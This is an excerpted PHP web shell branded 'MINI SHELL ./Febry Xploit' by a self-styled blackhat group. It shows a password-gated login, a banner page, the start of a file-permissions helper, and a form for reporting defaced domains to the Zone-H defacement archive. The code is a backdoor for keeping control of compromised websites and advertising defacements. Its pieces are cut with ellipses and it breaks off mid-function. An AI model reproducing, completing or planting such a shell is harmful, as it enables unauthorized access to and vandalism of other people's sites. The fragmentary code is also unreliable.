...
if($_POST['password'] == $pass) {
  ...
  echo "<script>window.location='?MINI SHELL Febryy'</script>";
}
if($_GET['page'] == "blank") {
  echo "<a href='?'>Back</a>";
  exit();
...
if(isset($_REQUEST['logout'])) {
  session_destroy();
  echo "<script>window.location='?MINI SHELL ./Febry Xploit</script>";
}
if(!($_SESSION['forbidden'])) {
?>
<title>-=[MINI SHELL ./Febry Xploit]=-</title>
...
<body bgcolor="black">
	<center><img src="https://a.top4top.io/p_2195ot56q9.jpg" style="opacity:0.5; width:290px; height:300px";></center>
	<center><h1><center><font color="red" face="Patrick Hand">[Tugu</font><font color="white" face="Patrick Hand"> Blackhat ]</font><br>
</center>
...
<body>
<center><font size="5" color="red" face="Patrick Hand"><h2>-=[MINI SHELL ./Febry Xploit]=-</h2></font>
</center>
...
if($_GET['to'] == 'zoneh') {
	if($_POST['submit']) {
		...
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='./Febry Xploit'><br>
		<u>Domains</u>: <br>
...
echo '<center><br/>© DESSIGNER ./Febry Xploit Ft Havi_DarKNet</center>
</body>
</html>';
function perms($file){
